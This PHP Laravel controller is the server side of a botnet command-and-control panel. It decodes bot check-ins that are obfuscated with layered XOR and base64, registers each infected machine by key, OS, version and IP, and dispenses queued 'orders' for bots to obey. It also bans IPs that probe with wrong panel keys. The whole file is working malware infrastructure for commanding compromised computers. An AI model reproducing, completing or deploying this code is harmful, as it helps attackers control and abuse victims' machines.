<?php

namespace App\Http\Controllers\Api;

use App\Bot;
use App\Connection;
use App\falsePanelKey;
use App\Order;
use App\panelCredential;
use Illuminate\Support\Facades\Auth;
use phpDocumentor\Reflection\Types\Object_;
use Request;
use App\Http\Controllers\Controller;
use App\Http\Controllers\BotsController;
use App\Http\Controllers\OrdersController;


class ApiController extends Controller
{
    /**
     * Receive the GET request and constructor
     * @param $panelKey
     * @param $dataReq
     * @return array
     */
    public function apiRequestConstructor($panelKey,$dataReq){

        $panelKey = base64_decode($panelKey);
        //Check if the ip is banned
        $banIp = falsePanelKey::where('ip', Request::ip())->first();
        if($banIp !== null){
            return base64_encode($this->xorIt(json_encode(['action'=>null]), str_random(8)));
        }
        //Get the credentials of the User!
        $panel = panelCredential::where('panelKey', $panelKey)->first();
        //If panelKey is false, Ban user ip!
        if($panel === null){
            //Ban Ip
            $this->banIp(Request::ip());
            return base64_encode($this->xorIt(json_encode(['action'=>null]), str_random(8)));
        }
        //Decode data
        $getDecode = $this->decodeConstructor($dataReq,$panel);
        //Create/Get the bot data
        $data = ['botKey'=>$getDecode['botKey'],'oS'=>$getDecode['oS'],'ip'=>Request::ip(),'bot_version'=>$getDecode['botVersion'],'country'=>'Germany','panel_credential_id'=>$panel->id];
        $bot = $this->botConstructor($data);
        //Create a connection entry to keep tracking the bot status(on,sleep,dead)
        $this->newConnection($bot->id);
        //Send an order and Create an entry for each order taken by the bot, to keep tracking the new orders to obeyed;
        $order = $this->getOrder($bot->id,$panelKey);
        //Xor it and return
        return $this->encodeConstructor($order,$panel);
    }

    /**
     * Decode Constructor
     *
     * @param $data
     * @param $panel
     * @return array
     */
    private function decodeConstructor($data, $panel){


        //Decode base64
        $a = base64_decode($data);
        //Decode xorEncode reversed!
        $b = $this->xorIt($a,strrev($panel->cryptKey).$panel->cryptKey);
        //Decode base64
        $c = base64_decode($b);
        //Decode xor flat
         $d = $this->xorIt($c,$panel->cryptKey);
        //Check if the count of "/" is iqual to 2
        $h = explode('/',$d);

        //organise Array
        $array = ['botKey'=>$h[0],'oS'=>$h[1],'botVersion'=>$h[2]];

        return $array;

    }

    /**
     * Encode Constructor
     *
     * @param $data
     * @param $panel
     * @return array
     */
    private function encodeConstructor($data, $panel){
        //encode Xor
        $a = $this->xorIt($data, $panel->cryptKey);
        //encode base64
        $b = base64_encode($a);
        //encode xor->reversed
        $c = $this->xorIt($b,strrev($panel->cryptKey).$panel->cryptKey);
        //encode base64
        return base64_encode($c) ;
    }

    /**
     * Check if bot exist
     *
     * @param $data
     *
     * @return Object_;
     */
    private function botConstructor($data){

        $bot = Bot::where('botKey', $data['botKey'])->first();
        if($bot === null){
            $bot = BotsController::createBot($data);
        }else{
            $bot->ip = $data['ip'];
            ///Todo->Change the country base on ip
            $bot->update();
        }

        return $bot;
    }

    /**
     * Create an entry on connection from the bot login
     *
     * @param $botId
     *
     * @return ''
     */
    private function newConnection($botId){
        $connection = Connection::create(['bot_id'=>$botId]);
        return $connection;
    }

    /**
     * Get Order for boot
     *
     * @param $bot_id
     * @param $panel_key
     *
     * @return array
     */
    private function getOrder($bot_id,$panel_key){

        //Get PanelCredentials for the log user
        $panelCredentials = panelCredential::where('panelKey', $panel_key)->first();

        $lastOrder = Bot::where('id', $bot_id)->first()->obeyed()->orderBy('created_at', 'desc')->first();
        //All orders Obeyed !
        $allObeyed =  Bot::where('id', $bot_id)->first()->obeyed()->get();

        //Get the First Order To do
        if($lastOrder !== null){
            $lastCreatedAt = $lastOrder->order()->first();
            $order = Order::where('created_at','>',$lastCreatedAt->created_at)->whereNotIn('id', $allObeyed->pluck('order_id'))->where('panel_credential_id', $panelCredentials->id)->orderBy('created_at','asc')->where('status', '1')->first();
        }
        else{
            $order = Order::orderBy('created_at','asc')->where('panel_credential_id', $panelCredentials->id)->where('status', '1')->first();
        }

        //If new order exist, encrypt it, an return it, else send the default msg to client;
        if($order !== null){

            $arrayOrder = ['action'=>$order->action,'data'=>$order->data];
        //Create an entry to keep tracking the bot Orders
            OrdersController::newObeyedEntry($bot_id,$order->id);
        }
        else{
            $arrayOrder = ['action'=>null];
        }

        return json_encode($arrayOrder);
    }

    /**
     * @param $InputString
     * @param $KeyString
     * @return string
     */
    private function xorIt($InputString, $KeyString)
    {

        // Let's define our key here
        $key = $KeyString;

        // Our plaintext/ciphertext
        $text = $InputString;

        // Our output text
        $outText = '';

        // Iterate through each character
        for($i=0; $i<strlen($text); )
        {

            for($j=0; ($j<strlen($key) && $i<strlen($text)); $j++,$i++)
            {
                $outText .= $text{$i} ^ $key{$j};
                //echo 'i=' . $i . ', ' . 'j=' . $j . ', ' . $outText{$i} . '<br />'; // For debugging
            }

        }

        return $outText;
    }

    /**
     * Create an entry of the false panelKey Adept
     * @param ip
     *
     */
    private function banIp($ip){
        $falseKey =  falsePanelKey::create(['ip'=>$ip]);
        return $falseKey;
    }

}
